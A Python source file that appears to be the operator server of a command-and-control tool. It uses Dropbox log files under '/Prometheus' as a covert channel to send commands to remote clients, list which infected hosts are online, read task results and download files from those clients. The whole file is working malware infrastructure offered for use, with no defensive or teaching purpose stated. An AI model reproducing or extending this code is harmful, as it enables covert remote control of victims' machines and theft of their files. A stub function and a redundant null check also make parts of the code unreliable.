import time

from .ccchanel import log as cclog
from .ccchanel import file as ccfile
from .ccchanel import dropbox_api as cc_api

from .server import cmd as scmd
from .server import repl as srepl
from .server import util as sutil


def check_pong(dbx, path):
    log = cclog.log_read(dbx, path)


def dispatch_command(dbx, path, command, *args):
    payload = scmd.command_create(command, *args)
    cclog.log_append(dbx, path, payload)


def handle_local_command(dbx, command, *args):
    if command == 'get':
        ccfile.download_file_as(dbx, args[0], f'/tmp/{args[0].replace("/", "_")}')
    elif command == 'cat':
        log = cclog.log_read(dbx, args[0])
        print(f"SERVER: cating {args[0]}")
        print(log)
    elif command == 'online':
        file_list = ccfile.list_files(dbx, '').keys()
        hosts = []
        for filename in file_list:
            filename = f"/{filename}"
            log = cclog.log_read(dbx, filename)
            if log is not None and sutil.is_online(log):
                hosts.append(filename)
        print(f"SERVER: listing online clients")
        print(hosts)
    elif command == 'result':
        log = cclog.log_read(dbx, args[0])
        if log is not None:
            if log is not None:
                id = int(args[1])
                result = sutil.get_done_with_id(log, id)
                print(f"SERVER: result of task {args[1]}: {result}")
            else:
                print(f"SERVER: no result for task {args[1]}")
        else:
            print(f"SERVER: no log for {args[0]}")


def main():
    dbx = cc_api.dropbox_login()
    path = "/Prometheus"
    print(sutil.help_string())
    while True:
        parsed_cmd = srepl.parse_command()
        if parsed_cmd is not None:
            if parsed_cmd.get('remote', False):
                cmd = parsed_cmd['remote']
                dispatch_command(dbx, cmd['target'], cmd['command'], *cmd['args'])
            elif parsed_cmd.get('local', False):
                cmd = parsed_cmd['local']
                handle_local_command(dbx, cmd['command'], *cmd['args'])
        else:
            print(sutil.help_string())
        time.sleep(1)  # Limit 1 cmd per second, so I dont have to deal with ids xD (timestamp is also id, cuz its easy)


if __name__ == "__main__":
    main()